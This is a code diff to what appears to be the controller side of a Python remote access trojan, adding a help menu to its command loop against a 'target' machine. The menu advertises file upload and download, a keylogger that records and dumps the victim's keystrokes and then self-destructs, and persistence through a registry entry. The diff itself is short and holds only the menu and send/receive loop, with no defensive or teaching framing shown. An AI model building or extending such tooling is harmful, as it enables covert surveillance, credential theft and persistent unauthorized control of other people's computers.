@@ -21,6 +21,18 @@ def target_communication():
         reliable_send(command)
         if command == 'quit':
             break
+        elif command == 'help':
+            print(termcolor.colored(''' \n
+            quit                                --> Quit Session With The Target
+            clear                               --> Clear The Screen
+            cd *Directory Name *                --> Changes Directory On Target System
+            upload *file name*                  --> Upload File To The Target Machine
+            download *file name*                --> Download File From Target Machine
+            keylog_start                        --> Start The Keylogger
+            keylog_dump                         --> Print Keystrokes That The Target Inputted
+            keylog_stop                         --> Stop And Self Destuct Keylooger File
+            persistent *RegName* *fileName*     --> Create Persistent In Registry'''))
+            
         result = reliable_recv()
         print(result)
     
